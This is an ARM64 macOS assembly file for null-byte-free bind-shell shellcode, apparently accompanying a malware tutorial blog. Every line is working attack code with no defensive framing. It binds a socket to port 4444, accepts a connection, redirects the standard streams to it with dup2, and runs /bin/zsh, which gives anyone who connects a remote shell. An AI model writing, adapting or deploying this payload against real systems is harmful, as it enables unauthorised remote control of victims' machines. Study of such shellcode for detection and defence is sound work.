; hack2.s
; bind shell ARM (no null bytes)
; author: @cocomelonc
; https://cocomelonc.github.io/macos/2025/09/01/malware-mac-11.html

.global _start
.align 4

_start:
  ; create a socket
  mov     x3, #0x0201                 ; x3 = 0x201
  lsr     x0, x3, #8                  ; x0 = 2 (pf_inet)
  lsr     x1, x0, #1                  ; x1 = 1 (sock_stream)
  mov     x2, xzr                     ; x2 = 0 (ipproto_ip)
  mov     x16, #97                    ; bsd syscall: socket (97)
  svc     #0xffff                     ; exec syscall
  lsl     x19, x0, #0                 ; store socket descriptor in x19

  ; bind socket to local address 0.0.0.0:4444
  mov     x2, #16                     ; address_len = 16
  mov     x4, #0x0200                 ; sin_family = af_inet (2)
  movk    x4, #0x5c11, lsl#16         ; sin_port = htons(4444) = 0x5c11
  stp     x4, xzr, [sp, #-16]!        ; push sockaddr_in to stack
  add     x1, sp, xzr                 ; x1 -> sockaddr_in
  mov     x16, #104                   ; bsd syscall: bind (104)
  svc     #0xffff                     ; exec syscall

  ; listen for incoming connections
  mov     x0, x19                     ; x0 = socket descriptor
  mov     x1, xzr                     ; backlog = 0
  mov     x16, #106                   ; bsd syscall: listen (106)
  svc     #0xffff                     ; exec syscall

  ; accept connection
  mov     x0, x19                     ; x0 = socket descriptor
  mov     x1, xzr                     ; no client addr needed
  mov     x2, xzr                     ; no addr len needed
  mov     x16, #30                    ; bsd syscall: accept (30)
  svc     #0xffff                     ; syscall run
  lsl     x20, x0, #0                 ; save accepted socket to x20

  ; redirect stdin, stdout, stderr to accepted socket
  mov     x16, #90                    ; bsd syscall: dup2 (90)
  mov     x1, #0x0201                 ; target fd = 2 (stderr)
  lsr     x1, x1, #8                  ; x1 = 2
  svc     #0xffff                     ; dup2(x20, 2)

  mov     x0, x20                     ; restore client socket
  mov     x1, #0x0101                 ; target fd = 1 (stdout)
  lsr     x1, x1, #8                  ; x1 = 1
  svc     #0xffff                     ; dup2(x20, 1)

  mov     x0, x20                     ; restore client socket
  lsr     x1, x1, #1                  ; x1 = 0 (stdin)
  svc     #0xffff                     ; dup2(x20, 0)

  ; final: execve("/bin/zsh", ["/bin/zsh"], null)
  mov     x3, #0x622f                 ; "/bin/zsh" (part 1)
  movk    x3, #0x6e69, lsl#16         ;
  movk    x3, #0x7a2f, lsl#32         ;
  movk    x3, #0x6873, lsl#48         ;
  stp     x3, xzr, [sp, #-16]!        ; push path and null terminator
  add     x0, sp, xzr                 ; x0 = "/bin/zsh"
  stp     x0, xzr, [sp, #-16]!        ; push argv = {"/bin/zsh", null}
  add     x1, sp, xzr                 ; x1 = argv
  mov     x2, xzr                     ; x2 = envp = null
  mov     x16, #59                    ; bsd syscall: execve (59)
  svc     #0xffff                     ; call kernel